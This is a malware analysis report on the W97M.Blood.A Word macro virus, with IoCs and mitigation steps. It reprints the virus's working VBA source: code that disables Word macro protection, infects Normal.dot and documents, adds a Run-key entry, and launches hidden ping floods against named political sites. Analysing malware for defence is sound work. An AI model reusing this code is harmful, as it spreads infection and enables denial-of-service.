# 🛡️ Malware Analysis Report: W97M.Blood.A

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-Word%20Macro%20Virus-red)
![Creation Date](https://img.shields.io/badge/created-2001--06--18-orange)
![File Size](https://img.shields.io/badge/size-~2.6KB-lightgrey)

## Overview

W97M.Blood.A is a Microsoft Word macro virus authored by PetiK (dated June 18, 2001). The macro module `Blood` disables Word's macro security, infects the global template (`Normal.dot`), drops an auxiliary file, alters system owner metadata on a trigger date, creates a local folder with a text message, launches a rudimentary DoS (ping flood) against specified domains, and includes minor social engineering payloads.

Artifacts in this folder:
- `Blood.bas` — VBA source module
- `Blood.do_` — likely obfuscated or packed document/sample stub

> Disclaimer: Historical malware analysis for research/education. Do not execute outside an isolated lab environment.

## Core Macros

The module defines the following procedures:
- `AutoOpen` – main infection & setup routine.
- `HelpAbout` – displays Office Assistant balloon (branding).
- `ViewVBCode` – sets a Run key to disable mouse, shows a warning, opens VBE.
- `AutoClose` – shows localized French message then calls `PetiK` and `Attak`.
- `PetiK` – creates folder + message file, sets it read-only.
- `Attak` – issues continuous ICMP ping commands as a crude DoS attempt.

## Infection Routine (AutoOpen)

```vb
Sub AutoOpen()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
WordBasic.DisableAutoMacros 0

Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
win = Environ("windir")
DropFile = win & "\blood.sys"
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") <> "OK" Then
    Doc("Blood").Export DropFile
    Nor.Import DropFile
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Blood\", "InfectDot") = "OK"
End If
If Doc.Item("Blood").Name <> "Blood" Then
    Nor("Blood").Export DropFile
    Doc.Import DropFile
    ActiveDocument.Save
End If

If Day(Now) = 15 Then
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "BloodMan"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "PetiK Corporation"
End If
End Sub
```

Key actions:
- Disables conversion prompts, macro virus protection, and Normal template save warnings.
- Downgrades macro security Level for Office 9.0/10.0; reenables auto-macros.
- Exports/imports module `Blood` between Active Document and `Normal.dot` (bidirectional infection).
- Uses a registry flag (`InfectDot`) to avoid redundant template infection.
- Trigger: On the 15th day of any month, overwrites Windows RegisteredOwner / RegisteredOrganization values.

## Branding / Social Engineering (HelpAbout)

Displays author attribution via Office Assistant balloon:

```vb
Sub HelpAbout()
With Application.Assistant: .Visible = True: End With
With Assistant.NewBalloon
    .Text = "W97M.Blood.A coded by PetiK (c)2001"
    .Heading = "W97M.Blood"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With
End Sub
```

## Mouse Disable & Editor Exposure (ViewVBCode)

```vb
Sub ViewVBCode()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "Blood1") = "rundll32 mouse,disable"
MsgBox "Your computer is dead." & vbCr & "Don't stop your machine", vbCritical, "W97M.Blood"
ShowVisualBasicEditor = True
End Sub
```

Notes:
- Writes a Run key value intended to call a non-standard `rundll32 mouse,disable` command (likely ineffective or relies on a malicious DLL named `mouse`).
- Opens the VBE which both flaunts the code and increases infection chance if victims distribute edited documents.

## AutoClose Payload Chain

```vb
Sub AutoClose()
MsgBox "PetiK vous souhaite une très bonne journée", vbExclamation, "W97M.Blood"
Call PetiK
Call Attak
End Sub
```

French message (“wishes you a very good day”), then file creation + network attack.

## Folder & Message Drop (PetiK)

```vb
Sub PetiK()
win = Environ("windir")
FileSystem.MkDir win & "\Blood"
Open win & "\Blood\TitleBlood.txt" For Output As #1
Print #1, "For the new Macro Virus W97M.Blood by PetiK"
Print #1, ""
Print #1, "Hi " & Application.UserName & ","
Print #1, "How do you do ?"
Print #1, "Your computer is infected by Blood"
Print #1, "It's not a dangerous macro."
Print #1, "         Bye.    PetiK"
Close #1
FileSystem.SetAttr win & "\Blood\TitleBlood.txt", vbReadOnly
End Sub
```

Creates a read-only “calling card” text file in `%WINDIR%\Blood`.

## Network Attack (Attak)

```vb
Sub Attak()
Shell "ping -l 5000 -t www.front-national.fr", vbHide
Shell "ping -l 5000 -t front-national.fr", vbHide
End Sub
```

Launches two continuous ICMP floods (5000-byte payload) against specified political domains (denial-of-service intent). This is an abusive side-effect and can consume network bandwidth.

## Indicators of Compromise (IoCs)

- Files / directories:
  - `%WINDIR%\blood.sys` (exported macro module)
  - `%WINDIR%\Blood\TitleBlood.txt` (read-only)
- Registry keys:
  - `HKLM\Software\Microsoft\Windows\Blood\InfectDot = OK`
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner = BloodMan` (if trigger day)
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization = PetiK Corporation` (if trigger day)
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Blood1 = rundll32 mouse,disable`
- Word settings weakened:
  - `HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level = 1`
  - `HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level = 1`

## Risks & Impact

- Security bypass encourages subsequent macro infections.
- Credential/identity spoofing by changing registered owner metadata.
- Persistent artifact creation & registry modifications.
- Potential network abuse (continuous ping flood).
- Social engineering and self-branding encourage curiosity rather than caution.

## Mitigation

1. Re-enable Word macro security; audit registry values for Level.
2. Remove malicious Run key (`Blood1`) and restore owner/organization values.
3. Delete `%WINDIR%\blood.sys` and `%WINDIR%\Blood\TitleBlood.txt` (adjust attributes if read-only).
4. Block or monitor unusual `ping -l 5000 -t` traffic.
5. Use endpoint protection that flags unauthorized VBProject manipulation.
6. Educate users not to enable macros in unsolicited documents.

## Notes

W97M.Blood combines typical early macro-virus tactics (Normal.dot infection, security downgrades) with light hacktivist elements (targeted ping flood) and vanity messaging. It lacks stealth beyond simple registry gating and does not attempt email propagation, focusing instead on persistence and minor disruptive actions.

— Analysis based on `Blood.bas` (June 18, 2001).